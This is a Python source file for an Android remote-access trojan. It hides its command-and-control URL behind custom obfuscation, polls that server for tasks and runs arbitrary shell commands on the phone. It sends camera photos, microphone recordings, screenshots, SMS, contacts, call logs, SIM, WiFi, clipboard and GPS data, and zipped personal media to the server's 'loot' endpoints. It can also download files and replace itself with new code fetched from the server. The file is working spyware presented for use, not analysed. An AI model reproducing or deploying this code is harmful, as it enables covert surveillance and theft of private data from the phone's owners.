import sys, os, subprocess, requests, time, platform, json

# --- Configuration (OPSEC: Advanced Obfuscated C2 URL) ---
def _xd(d, s="k3ycu5t0m", r=4):
    import hashlib
    if not d or len(d) < 2: return ""
    SB = [0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16]
    IS = [0]*256; [IS.__setitem__(v, i) for i, v in enumerate(SB)]
    sd = s.encode(); ks = []
    for _ in range(r): sd = hashlib.sha256(sd).digest(); ks.append(sd)
    raw = list(d); pc = [ks[-1][0]]
    for i in range(len(raw)):
        cur = raw[i]; raw[i] = (raw[i] - ks[2][i % len(ks[2])]) & 0xFF
        raw[i] ^= pc[-1]; pc.append(cur)
    m = len(raw) // 2; left, right = raw[:m], raw[m:]
    for rd in range(r - 1, -1, -1):
        rk = ks[rd % len(ks)]
        mx = [SB[(b ^ rk[i % len(rk)]) & 0xFF] for i, b in enumerate(left)]
        right = [b ^ x for b, x in zip(right, mx)]; left, right = right, left
    raw = left + right; n = len(raw); rs = int.from_bytes(ks[1][:8], 'big'); sw = []
    for i in range(n - 1, 0, -1):
        rs = (rs * 6364136223846793005 + 1442695040888963407) & 0xFFFFFFFFFFFFFFFF
        sw.append((i, rs % (i + 1)))
    for i, j in reversed(sw): raw[i], raw[j] = raw[j], raw[i]
    for i in range(len(raw)):
        k = ks[0][i % len(ks[0])]
        rt = (i + k) % 8; raw[i] = ((raw[i] >> rt) | (raw[i] << (8 - rt))) & 0xFF
        raw[i] = IS[(raw[i] ^ k) & 0xFF]
    ol = (raw[-2] << 8) | raw[-1]
    return bytes(raw[:ol]).decode()

# Obfuscated C2 endpoint (XOR encrypted)
# Use obfuscator.py to generate your own encoded bytes
_C2_ENC = bytes([0x00]) # PASTE_YOUR_BYTES_HERE # PASTE_YOUR_BYTES_HERE
C2_URL = _xd(_C2_ENC)
HEARTBEAT_INTERVAL = 5

# --- Runtime Detection ---
def is_termux():
    return os.path.exists("/data/data/com.termux") or "com.termux" in os.environ.get("PREFIX", "")

def is_apk():
    try:
        from jnius import autoclass
        return True
    except: return False

RUNTIME = "termux" if is_termux() else ("apk" if is_apk() else "unknown")
TEMP_DIR = os.path.join(os.getenv("PREFIX", "/data/data/com.termux/files/usr"), "tmp") if RUNTIME == "termux" else os.getenv("EXTERNAL_STORAGE", "/sdcard")

# --- Stateful Shell Class for Android ---
class StatefulShell:
    def __init__(self):
        # Start in Termux home (~) which always has permissions, /sdcard needs termux-setup-storage
        self.cwd = os.path.expanduser("~")
        if os.path.exists("/sdcard") and os.access("/sdcard", os.R_OK):
            self.cwd = "/sdcard"
    
    def execute(self, command):
        command = command.strip()
        if not command: return ""
        if command.lower().startswith('cd '):
            try:
                new_dir = command[3:].strip()
                if not os.path.isabs(new_dir): new_dir = os.path.join(self.cwd, new_dir)
                os.chdir(new_dir)
                self.cwd = os.getcwd()
                return f"Changed directory to: {self.cwd}"
            except Exception as e: return f"Error changing directory: {e}"
        try:
            shell_bin = "/data/data/com.termux/files/usr/bin/sh" if RUNTIME == "termux" else "/system/bin/sh"
            if not os.path.exists(shell_bin): shell_bin = "/bin/sh"
            result = subprocess.run([shell_bin, "-c", command], cwd=self.cwd, capture_output=True, text=True, errors='ignore', timeout=60)
            return result.stdout + result.stderr if (result.stdout + result.stderr) else "Command executed."
        except Exception as e: return f"Error executing command: {e}"

# --- Helper Functions ---
def post_output(client_id, cmd_id, command_line, output):
    # OPSEC: All output goes through C2 webhook proxy
    try:
        requests.post(f"{C2_URL}/report/{client_id}",
                     json={'cmd_id': cmd_id, 'output': output, 'command': command_line},
                     timeout=15)
    except: pass

def exfiltrate_file(filepath, client_id=None, message=""):
    # OPSEC: All files go through C2 webhook proxy
    try:
        if not os.path.exists(filepath) or os.path.getsize(filepath) == 0:
            return f"File exfiltration failed: '{os.path.basename(filepath)}' is missing or empty."
        with open(filepath, 'rb') as f:
            requests.post(f"{C2_URL}/loot/{client_id}",
                         data={"message": message},
                         files={"file": (os.path.basename(filepath), f.read())},
                         timeout=60)
        return ""
    except Exception as e:
        return f"File exfiltration failed: {e}"
    finally:
        if os.path.exists(filepath):
            try: os.remove(filepath)
            except: pass

# =========================================================================
# Hardware Interaction (Auto-Detects Termux:API vs Plyer/APK)
# =========================================================================

def _run_termux_cmd(cmd_list, timeout=15):
    """Helper to run termux-api commands silently."""
    try:
        res = subprocess.run(cmd_list, capture_output=True, text=True, timeout=timeout)
        return res.stdout.strip(), res.returncode == 0
    except Exception as e:
        return str(e), False

def get_geolocation():
    if RUNTIME == "termux":
        # --- Termux:API (Real GPS!) ---
        out, ok = _run_termux_cmd(["termux-location", "-p", "gps", "-r", "once"], timeout=20)
        if ok and out:
            try:
                data = json.loads(out)
                lat = data.get("latitude", "N/A")
                lon = data.get("longitude", "N/A")
                acc = data.get("accuracy", "N/A")
                return (f"Source: Android GPS (Termux:API)\n"
                        f"Coords: Lat={lat}, Lon={lon}\n"
                        f"Accuracy: {acc}m\n"
                        f"Maps: https://maps.google.com/?q={lat},{lon}"), None
            except: pass
    elif RUNTIME == "apk":
        try:
            from plyer import gps as _gps
            # Plyer GPS is async - fallback to IP
        except: pass
    
    # IP Fallback (works everywhere)
    try:
        r = requests.get('https://ipinfo.io/json', timeout=10); data = r.json()
        loc = data.get('loc', 'N/A').split(','); lat, lon = (loc[0], loc[1]) if len(loc) == 2 else ('N/A', 'N/A')
        return (f"Source: IP-based (INACCURATE)\nIP: {data.get('ip', 'N/A')}\n"
                f"Location: {data.get('city', 'N/A')}, {data.get('country', 'N/A')}\n"
                f"Coords: Lat={lat}, Lon={lon}\nMaps: https://maps.google.com/?q={lat},{lon}"), None
    except Exception as e: return None, f"Geolocation failed: {e}"

def take_webcam_photo(camera_id=0):
    filepath = os.path.join(TEMP_DIR, "cam.jpg")
    if RUNTIME == "termux":
        out, ok = _run_termux_cmd(["termux-camera-photo", "-c", str(camera_id), filepath], timeout=25)
        if ok and os.path.exists(filepath):
            return filepath, None
        return None, f"Termux camera failed: {out}. Make sure Termux:API is installed and camera permission is granted."
    elif RUNTIME == "apk":
        return None, "APK Camera requires foreground service. Use Termux:API for testing."
    return None, "Unknown runtime, camera not supported."

def record_audio(seconds=10):
    filepath = os.path.join(TEMP_DIR, "mic.m4a")
    if RUNTIME == "termux":
        # Start recording (AAC format = playable everywhere)
        _run_termux_cmd(["termux-microphone-record", "-f", filepath, "-l", str(seconds), "-e", "aac"], timeout=3)
        time.sleep(seconds + 2) # Wait for recording to finish
        _run_termux_cmd(["termux-microphone-record", "-q"], timeout=3) # Stop
        if os.path.exists(filepath) and os.path.getsize(filepath) > 0:
            return filepath, None
        return None, "Termux audio recording failed. Grant microphone permission to Termux:API."
    elif RUNTIME == "apk":
        try:
            from plyer import audio
            audio.file_path = filepath
            audio.start()
            time.sleep(seconds)
            audio.stop()
            return filepath, None
        except Exception as e:
            return None, f"APK Audio failed: {e}"
    return None, "Unknown runtime, audio not supported."

def take_screenshot():
    filepath = os.path.join(TEMP_DIR, "ss.png")
    if RUNTIME == "termux":
        # termux-screenshot requires Termux:X11 or root... try screencap
        out, ok = _run_termux_cmd(["su", "-c", f"screencap -p {filepath}"], timeout=10)
        if ok and os.path.exists(filepath):
            return filepath, None
        return None, "Screenshot requires ROOT (su). Device is not rooted."
    return None, "Screenshot not available on this runtime."

def get_battery_info():
    if RUNTIME == "termux":
        out, ok = _run_termux_cmd(["termux-battery-status"], timeout=5)
        if ok: return out, None
    return None, "Battery info not available."

def get_sms_list(limit=10):
    if RUNTIME == "termux":
        out, ok = _run_termux_cmd(["termux-sms-list", "-l", str(limit)], timeout=10)
        if ok: return out, None
        return None, "SMS access failed. Grant SMS permission to Termux:API."
    return None, "SMS reading only available via Termux:API."

def get_contacts():
    if RUNTIME == "termux":
        out, ok = _run_termux_cmd(["termux-contact-list"], timeout=10)
        if ok: return out, None
        return None, "Contacts access failed. Grant contacts permission to Termux:API."
    return None, "Contacts reading only available via Termux:API."

def get_clipboard():
    if RUNTIME == "termux":
        out, ok = _run_termux_cmd(["termux-clipboard-get"], timeout=5)
        if ok: return out if out else "(clipboard empty)", None
    return None, "Clipboard not available."

def vibrate_device(duration_ms=500):
    if RUNTIME == "termux":
        out, ok = _run_termux_cmd(["termux-vibrate", "-d", str(duration_ms)], timeout=3)
        if ok: return "Device vibrated.", None
    return None, "Vibrate not available."

def send_toast(message):
    if RUNTIME == "termux":
        out, ok = _run_termux_cmd(["termux-toast", message], timeout=3)
        if ok: return "Toast displayed on target.", None
    return None, "Toast not available."

def get_call_log(limit=20):
    if RUNTIME == "termux":
        out, ok = _run_termux_cmd(["termux-call-log", "-l", str(limit)], timeout=10)
        if ok and out:
            try:
                calls = json.loads(out)
                formatted = []
                for c in calls:
                    name = c.get('name', 'Unknown')
                    number = c.get('number', 'N/A')
                    call_type = c.get('type', 'N/A')
                    duration = c.get('duration', '0')
                    date = c.get('date', 'N/A')
                    formatted.append(f"{call_type:8s} | {name:20s} | {number:15s} | {duration}s | {date}")
                return "\n".join(formatted) if formatted else "No call logs found.", None
            except: return out, None
        return None, "Call log access failed. Grant Phone/Call Log permission to Termux:API."
    return None, "Call log only available via Termux:API."

def get_sim_info():
    if RUNTIME == "termux":
        out, ok = _run_termux_cmd(["termux-telephony-deviceinfo"], timeout=10)
        if ok and out:
            try:
                data = json.loads(out)
                info = (
                    f"Device ID: {data.get('device_id', 'Unknown')}\n"
                    f"Network Operator: {data.get('network_operator_name', 'Unknown')}\n"
                    f"SIM Operator: {data.get('sim_operator_name', 'Unknown')}\n"
                    f"SIM Serial: {data.get('sim_serial_number', 'Unknown')}\n"
                    f"Phone Number: {data.get('phone_number', 'Not available from SIM')}"
                )
                return info, None
            except: return out, None
        return None, "Telephony info access failed. Grant Phone permission to Termux:API."
    return None, "SIM info only available via Termux:API."
def get_wifi_info():
    if RUNTIME == "termux":
        out, ok = _run_termux_cmd(["termux-wifi-connectioninfo"], timeout=10)
        if ok and out:
            try:
                data = json.loads(out)
                ssid = data.get("ssid", "Unknown")
                ip = data.get("ip", "Unknown")
                mac = data.get("mac_address", "Unknown")
                speed = data.get("link_speed_mbps", "Unknown")
                return f"WiFi: {ssid}\nIP: {ip}\nMAC: {mac}\nSpeed: {speed} Mbps", None
            except: return out, None
        return None, "WiFi info access failed. Check Location permission (required for WiFi info on Android)."
    return None, "WiFi info only available via Termux:API."

def get_installed_apps():
    # Use Android's package manager natively, works on both termux and apk without root
    try:
        shell_bin = "/data/data/com.termux/files/usr/bin/sh" if RUNTIME == "termux" else "/system/bin/sh"
        if not os.path.exists(shell_bin): shell_bin = "/bin/sh"
        res = subprocess.run([shell_bin, "-c", "pm list packages -3"], capture_output=True, text=True, timeout=15)
        if res.returncode == 0 and res.stdout:
            apps = [line.replace("package:", "").strip() for line in res.stdout.strip().split("\n")]
            return "\n".join(sorted(apps)), None
    except Exception as e:
        return None, f"Failed to list apps: {e}"
    return None, "No third-party apps found or permission denied."

def get_sensor_data():
    if RUNTIME == "termux":
        # Get light and proximity (or all if not supported filtering)
        out, ok = _run_termux_cmd(["termux-sensor", "-s", "Light,Proximity,Accelerometer", "-n", "1"], timeout=10)
        if ok and out:
            try:
                data = json.loads(out)
                result = []
                for sensor_name, sensor_data in data.items():
                    values = sensor_data.get("values", [])
                    val_str = ", ".join([str(v) for v in values])
                    result.append(f"{sensor_name}: {val_str}")
                return "\n".join(result), None
            except: return out, None
        return None, "Sensor access failed."
    return None, "Sensor data only available via Termux:API."

import shutil
def steal_media(limit_str):
    if not (os.path.exists("/sdcard/DCIM") or os.path.exists("/sdcard/Download")):
        return None, "Storage access denied or /sdcard not found. Run 'termux-setup-storage' first."
        
    targets = ["/sdcard/DCIM/Camera", "/sdcard/Download", "/sdcard/Pictures"]
    all_files = []
    
    for t in targets:
        if not os.path.exists(t): continue
        for root, dirs, files in os.walk(t):
            for file in files:
                ext = file.lower().split('.')[-1]
                if ext in ['jpg', 'jpeg', 'png', 'mp4', 'pdf', 'zip']:
                    full_path = os.path.join(root, file)
                    try:
                        all_files.append((full_path, os.path.getmtime(full_path)))
                    except: pass
                    
    # Sort newest first
    all_files.sort(key=lambda x: x[1], reverse=True)
    
    if limit_str.lower() == "all":
        # Zip them up
        zip_path = os.path.join(TEMP_DIR, "media_loot.zip")
        try:
            import zipfile
            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                 # Be careful not to zip the whole phone, limit to 200 files
                 for filepath, _ in all_files[:200]:
                     zipf.write(filepath, arcname=os.path.basename(filepath))
            return zip_path, None
        except Exception as e:
             return None, f"Zipping failed: {e}"
             
    else:
        try: limit = int(limit_str)
        except: limit = 5
        
        if not all_files: return None, "No media files found."
        
        # We can only return one filepath for exfiltration, so we zip them if there's more than 1
        if limit == 1:
            return all_files[0][0], None
            
        zip_path = os.path.join(TEMP_DIR, "media_loot.zip")
        try:
            import zipfile
            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                 for filepath, _ in all_files[:limit]:
                     zipf.write(filepath, arcname=os.path.basename(filepath))
            return zip_path, None
        except Exception as e:
             return None, f"Zipping failed: {e}"

def self_update():
    try:
        r = requests.get(f"{C2_URL}/update", timeout=30)
        if r.status_code == 200:
            script_path = os.path.abspath(sys.argv[0])
            with open(script_path, 'w', encoding='utf-8') as f:
                f.write(r.text)
            os.execv(sys.executable, [sys.executable, script_path])
        else:
            return f"C2 returned {r.status_code}. No update available."
    except Exception as e:
        return f"Self-update failed: {e}"

# --- Main Logic ---
def main():
    shell = StatefulShell()
    
    # Build OS info string
    if RUNTIME == "apk":
        try:
            from jnius import autoclass
            Build = autoclass('android.os.Build')
            os_info = f"Android {Build.VERSION.RELEASE} (APK)"
        except: os_info = f"Android (APK) {platform.release()}"
    elif RUNTIME == "termux":
        os_info = f"Android/Termux {platform.release()} (-ph)"
    else:
        os_info = f"Linux {platform.release()} (-ph)"
        
    while True:
        client_id = None
        while not client_id:
            try:
                r = requests.post(f"{C2_URL}/register", json={'os_info': os_info}, timeout=10)
                r.raise_for_status()
                client_id = r.json().get('client_id')
            except Exception:
                time.sleep(HEARTBEAT_INTERVAL)
                
        while True:
            try:
                r = requests.post(f"{C2_URL}/heartbeat/{client_id}", json={'cwd': shell.cwd}, timeout=10)
                r.raise_for_status()
                tasks = r.json().get('tasks', [])
                for task in tasks:
                    cmd_id = task.get('cmd_id')
                    command_line = task.get('command', '').strip()
                    if not command_line: continue
                    parts = command_line.split()
                    cmd = parts[0].lower()
                    output = ""
                    
                    # --- Special Commands ---
                    if cmd in ["geolocate", "geo"]: 
                        report, err = get_geolocation(); output = err if err else report

                    elif cmd in ["screenshot", "ss"]: 
                        filepath, err = take_screenshot(); output = err if err else exfiltrate_file(filepath, client_id, f"Screenshot: `{client_id}`")

                    elif cmd in ["webcam", "wc"]: 
                        cam_id = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 0
                        filepath, err = take_webcam_photo(cam_id); output = err if err else exfiltrate_file(filepath, client_id, f"Android Cam{cam_id}: `{client_id}`")

                    elif cmd in ["record_audio", "rec_a"]: 
                        seconds = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 10
                        filepath, err = record_audio(seconds); output = err if err else exfiltrate_file(filepath, client_id, f"Android Audio ({seconds}s): `{client_id}`")

                    elif cmd in ["export", "exp"]:
                        filepath = command_line.split(maxsplit=1)[1] if len(parts) > 1 else ""
                        output = exfiltrate_file(filepath, client_id, f"Export: `{filepath}`") if filepath else "Error: filename required."

                    elif cmd == "sys_upload":
                        filename = command_line.split(maxsplit=1)[1] if len(parts) > 1 else ""
                        if filename:
                            try:
                                r = requests.get(f"{C2_URL}/serve/{filename}", timeout=30)
                                if r.status_code == 200:
                                    save_path = os.path.join(shell.cwd, filename)
                                    with open(save_path, "wb") as f: f.write(r.content)
                                    output = f"Uploaded `{filename}` to Android `{shell.cwd}`."
                                else: output = f"Failed to download {filename} from C2."
                            except Exception as e: output = f"sys_upload error: {e}"
                        else: output = "sys_upload error: no filename"

                    # --- Termux:API Bonus Commands ---
                    elif cmd == "battery":
                        report, err = get_battery_info(); output = err if err else report
                    elif cmd == "sms":
                        limit = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 10
                        report, err = get_sms_list(limit); output = err if err else report
                    elif cmd == "contacts":
                        report, err = get_contacts(); output = err if err else report
                    elif cmd == "clipboard":
                        report, err = get_clipboard(); output = err if err else report
                    elif cmd == "vibrate":
                        ms = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 500
                        report, err = vibrate_device(ms); output = err if err else report
                    elif cmd == "toast":
                        msg = command_line.split(maxsplit=1)[1] if len(parts) > 1 else "Hello from Fsociety"
                        report, err = send_toast(msg); output = err if err else report
                    elif cmd == "callog":
                        limit = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 20
                        report, err = get_call_log(limit); output = err if err else report
                    elif cmd == "sim_info":
                        report, err = get_sim_info(); output = err if err else report
                    elif cmd == "wifi_info":
                        report, err = get_wifi_info(); output = err if err else report
                    elif cmd == "apps":
                        report, err = get_installed_apps(); output = err if err else report
                    elif cmd == "sensor":
                        report, err = get_sensor_data(); output = err if err else report
                    elif cmd == "steal" and len(parts) >= 2 and parts[1].lower() == "media":
                        limit_str = parts[2] if len(parts) > 2 else "5"
                        filepath, err = steal_media(limit_str)
                        if err: output = err
                        else: output = exfiltrate_file(filepath, client_id, f"Android Media Loot (`{limit_str}` files) from `{client_id}`")
                    elif cmd == "sys_update":
                        output = self_update() or "Restarting with new payload..."

                    else: 
                        output = shell.execute(command_line)
                    
                    if output:
                        post_output(client_id, cmd_id, command_line, str(output))
            except requests.exceptions.RequestException:
                break
            except Exception:
                pass

            time.sleep(HEARTBEAT_INTERVAL)

if __name__ == '__main__':
    main()
